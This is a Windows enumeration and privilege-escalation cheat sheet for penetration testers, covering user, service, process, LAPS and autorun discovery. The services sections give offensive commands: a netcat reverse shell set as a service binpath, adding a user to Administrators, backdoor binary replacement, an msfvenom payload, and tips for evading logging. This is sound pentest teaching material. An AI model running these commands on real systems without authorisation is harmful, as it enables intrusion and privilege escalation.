# Enumeration

Be aware sometimes these commands require elevated privileges to be run, or may be blocked by GPO.

(./winpeas.exe)[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS] #My favorite Windows enumeration script, automates most common enumeration methods 

# User Enumeration
### Get list of current user information:  
`whoami /all` Includes: Username, SID, Groups \(including their descriptions!\), and user privileges.
`Get-WmiObject -class Win32_UserAccount [-filter "LocalAccount=True"]` #filter does not work on my work computer...but without it dumps all accounts on the whole domain!

(cmd.exe)
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

(Powershell)
Get-WmiObject -Class Win32_UserAccount

## LAPS

LAPS allows you to manage the local Administrator password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.
`reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled`
When using LAPS, 2 new attributes appear in the computer objects of the domain: ms-msc-AdmPwd and ms-mcs-AdmPwdExpirationTime. These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes...


# OS Information
## Get OS Version information
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
`[System.Environment]::OSVersion.Version`

## Get basic Windows information 
Also lists the patches that have been installed. 
`systeminfo`
`Get-ComputerInfo`

## Get installed patches
`wmic qfe get Caption,Description,HotFixID,InstalledOn` 
`Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}`
`Get-Hotfix`
  `-description "Security update"` #List only "Security Updates"

## Drivers
### Get a list of installed drivers
`driverquery`
`Get-WindowsDriver -Online -All`
`-Online` Specifies that the action is to be taken on the operating system that is currently running on the local computer.

### Default log path
`%WINDIR%\Logs\Dism\dism.log`
### Make back up of all installed drivers
`Export-WindowsDriver -Online -Destination "C:\Backup\Path\"`

## List Environment Variables
`set`
`Get-ChildItem env:`

## Check Audit (logging) Settings
These settings show what is being logged, this can be useful information for evasion and persistence
`reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit`

### Windows Event Forwarding 
(where are the logs sent)
`reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager`

## AV
Check if there is any antivirus intalled:
`WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get DisplayName | fl`

## Clipboard
Get the contents of the clipboard
`Get-Clipboard`


# Software, Services, and Processes
## Software

### List the installed software
`dir /a "C:\Program Files"`
`dir /a "C:\Program Files (x86)"`
`reg query HKEY_LOCAL_MACHINE\SOFTWARE`

`Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)'`
`Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE`
## Services
Get a list of services:
`net start`
`wmic service list brief`
`sc query`
`Get-Process`
### Get detailed information for a specific service
`sc qc <service_name>` 
To use this command in PowerShell you need to specify `sc.exe` instead of `sc`.  In PowerShell `sc` is an alias for `Set-Content` and will not give the expected output.

`Get-Service`

### Enable a disabled service
If you are having this error (for example with SSDPSRV):
> System error 1058 has occurred. 
> The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
You can enable it using:
```
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
Note: In Windows XP SP1, the service upnphost depends on SSDPSRV to work

### Enable a disabled service
If you are having this error (for example with SSDPSRV):
> System error 1058 has occurred. 
> The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
You can enable it using:
```
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
Note: In Windows XP SP1, the service upnphost depends on SSDPSRV to work

### Modify service binary path (*move to privilege escalation/persistence pages*)
If one of the groups you have access to has SERVICE_ALL_ACCESS in a service, then it can modify the binary that is being executed by the service. To modify it and execute nc you can do:
```
sc config <service_Name> binpath= "C:\nc.exe -nv <IP> <port> -e C:\WINDOWS\System32\cmd.exe"
//use SYSTEM privileged service to add your user to administrators group
sc config <service_Name> binpath= "net localgroup administrators <username> /add"
//replace executable with your own binary (best to only do this for unused services!)
sc config <service_name> binpath= "C:\path\to\backdoor.exe"
```
### Service Permissions (*move to privilege escalation/persistence pages*)
Other Permissions can be used to escalate privileges:
SERVICE_CHANGE_CONFIG Can reconfigure the service binary
WRITE_DAC: Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG
WRITE_OWNER: Can become owner, reconfigure permissions
GENERIC_WRITE: Inherits SERVICE_CHANGE_CONFIG
GENERIC_ALL: Inherits SERVICE_CHANGE_CONFIG
To detect and exploit this vulnerability you can use exploit/windows/local/service_permissions

Check if you can modify the binary that is executed by a service.
You can get every binary that is executed by a service using wmic (not in system32) and check your permissions using icacls:
```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
You can also use sc and icacls:
```
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry permissions (*move to privilege escalation/persistence pages*)
You should check if you can modify any service registry. You can check your permissions over a service registry doing:
```
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Check if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl. In that case you can change the binary that is going to be executed by the service.
To change the Path of the binary executed:
`reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f`

### Unquoted Service Paths (*move to privilege escalation/persistence pages*)
If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.
For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:
```
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```
To list all unquoted service paths (minus built-in Windows services)
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
```
-or-
```
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```
-also-
```
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
You can detect and exploit this vulnerability with metasploit: `exploit/windows/local/trusted_service_path`
You can manually create a service binary with msfvenom: `msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe`



## Get running processes
Lists all the service information for each process with `tasklist /svc`. Valid when the `/fo <format>` parameter is set to table (default format). Can be run remotely with `/s <name or IP address>` and credentialed with `/u <username>` and `/p <password>`. `/v` = verbose

With usernames of process owner
`Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize`

Without usernames
`Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id`

### Check permissions of the process binaries
```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z" 
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```
### Check permissions of the folders of the process binaries (useful for dll injection)
```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
todos %username%" && echo.
)
```
## Get current network connections
`netstat -ano` 

https://github.com/carlospolop/hacktricks/blob/master/windows/basic-cmd-for-pentesters.md#network (*check for more network enumeration info here)

## AutoRuns
Check which files are executed when the computer is started. Components that are executed when a user logins can be exploited to execute malicious code when the administrator logins.
(cmd.exe)
wmic startup get caption,command 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul & ^
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
(powershell)
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
### SysInternals AutoRuns

For a comprehensive list of auto-executed files you can use AutoRuns from SysInternals https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns:
`autorunsc.exe -m -nobanner -a * -ct /accepteula`


# References

- https://docs.microsoft.com/en-us/sysinternals/
- https://docs.microsoft.com/en-us/powershell/
